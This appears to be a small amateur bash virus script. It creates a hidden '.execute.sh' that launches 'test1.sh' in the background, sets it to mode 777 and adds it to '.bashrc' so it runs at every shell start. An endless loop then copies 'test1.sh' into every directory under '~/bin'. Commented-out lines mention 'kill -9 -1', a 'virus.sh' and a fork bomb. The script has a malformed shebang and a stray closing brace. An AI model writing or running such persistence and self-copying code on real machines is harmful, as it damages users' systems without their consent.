
#!bin/bash
#blame
if [ -f ".execute.sh" ]
then
	file='.execute.sh'
else
	touch .execute.sh
	echo 'bash test1.sh &' >> .execute.sh
	chmod 777 .execute.sh
	chmod a+x .execute.sh
	echo 'bash .execute.sh' >> .bashrc
fi
#delayed to slow the response
while sleep 2s
do
cd ~/
find bin -type d -exec cp  test1.sh {} \;
#sleep 2s
#Instant logging  off
#kill -9 -1
# bash virus.sh   forkBomb
done
}

